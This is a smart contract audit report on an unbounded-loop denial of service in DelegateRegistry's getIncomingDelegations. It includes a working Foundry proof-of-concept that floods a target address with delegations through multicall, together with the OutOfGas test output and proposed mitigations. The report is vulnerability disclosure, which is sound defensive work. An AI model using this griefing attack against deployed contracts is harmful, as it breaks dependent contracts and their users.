# Lines of code

https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L262-L264
https://github.com/delegatexyz/delegate-registry/blob/6d1254de793ccc40134f9bec0b7cb3d9c3632bc1/src/DelegateRegistry.sol#L411-L427


# Vulnerability details

### Impact

The `getIncomingDelegations` function is designed to retrieve incoming delegations for a specific address. However, the function is susceptible to a denial of service (DoS) attack due to an unbounded loop that iterates through the elements of `incomingDelegationHashes[to]` array. An attacker can easily manipulate the array by adding a large number of hashes, causing the loop to consume excessive gas and eventually run out of gas. This attack can disrupt the normal functioning of the contract and potentially break another contract calling this one, which is the purpose of it.

### Proof of Concept

To demonstrate this vulnerability, an attacker can repeatedly add hashes to the `incomingDelegationHashes` array associated with a specific address, `to`. It can easily be done by using`multicall` function and by modifying the `rights` parameter of `delegateAll` function.

Here is a test prooving the issue feasibility:
````
// SPDX-License-Identifier: CC0-1.0
pragma  solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {DelegateRegistry} from "src/DelegateRegistry.sol";
import {IDelegateRegistry} from "src/IDelegateRegistry.sol";
import  "forge-std/console.sol";

contract  VulnerabilityTest  is Test {
	DelegateRegistry public reg;
	bytes32  public rights = "";

	address targetAddress = address(0xdead);
	address targetContract = address(0x123);

	function  setUp() public {
		reg = new  DelegateRegistry();
	}

	function  _attack() public {

		vm.prank(address(123456)); //any address can perform the hack
		uint256 batch_size = 20500;

		// First step : Malicious multicall to add a large number of hashes to the target address
		bytes[] memory data = new  bytes[](batch_size);

		for (uint256 i = 0; i < batch_size; i++) {
			// Craft data for delegateAll to add a hash to the target address
			bytes  memory delegateAllData = abi.encodeWithSignature(
			"delegateAll(address,bytes32,bool)",
			targetAddress,
			bytes32(i), // Some unique rights for each iteration
			true  // Enable delegation
			);
			data[i] = delegateAllData;
		}
		bytes[] memory data2 = new  bytes[](batch_size);
		for (uint256 i = 0; i < batch_size; i++) {
			// Craft data for delegateAll to add a hash to the target address
			bytes  memory delegateAllData = abi.encodeWithSignature(
			"delegateAll(address,bytes32,bool)",
			targetAddress,
			bytes32(i + batch_size), // Some unique rights for each iteration
			true  // Enable delegation
			);
			data2[i] = delegateAllData;
		}

		reg.multicall(data);
		reg.multicall(data2);
	}

	function  testVulnerabilityProof() public {

		_attack();

		vm.prank(targetAddress);
		console.log("Gas left: ", gasleft());
		console.log("Proof that nothing was out of gas before this specific call");

		reg.getIncomingDelegations(targetAddress);
	}	  
}
````

As the number of hashes in the array increases, the gas cost of iterating through the array in the `_getValidDelegationsFromHashes` function also increases. Eventually, when the gas limit is reached, the contract will be unable to complete the execution of the `getIncomingDelegations` function, causing a DoS condition.

In this example, with 40500 different delegates to the same address, it is enough to cause a DoS. 
With `forge test --match-contract VulnerabilityTest -vv` command, here is the output :

    Running 1 test for test/VulnerabilityProofTest.t.sol:VulnerabilityTest
    [FAIL. Reason: EvmError: OutOfGas] testVulnerabilityProof() (gas: 9223372036854754743)
    Logs:
      Gas left:  9223372031600219234
      Proof that nothing was out of gas before this specific call

    Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.92s

    Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

    Failing tests:
    Encountered 1 failing test in test/VulnerabilityProofTest.t.sol:VulnerabilityTest
    [FAIL. Reason: EvmError: OutOfGas] testVulnerabilityProof() (gas: 9223372036854754743)

    Encountered a total of 1 failing tests, 0 tests succeeded

It shows that the victim (which can be another smart contract using this function for an airdrop for example) was not able to find the outgoing addresses.

### Tools Used
No specific tools are required for this proof of concept as it is a logical vulnerability. I used forge for the PoC.

### Recommended Mitigation Steps
There are 3 possibilities.
1. Introduce limits on the number of hashes that can be added or processed within a single transaction.
2. Accept that this function should not be called or used by any other account than EOA. To do so,
	- add a comment
	- delete this function and retrieve this information out of the blockchain for your app
3. Create a function to get array data by index range.

In any case, no external smart contract should use this function.


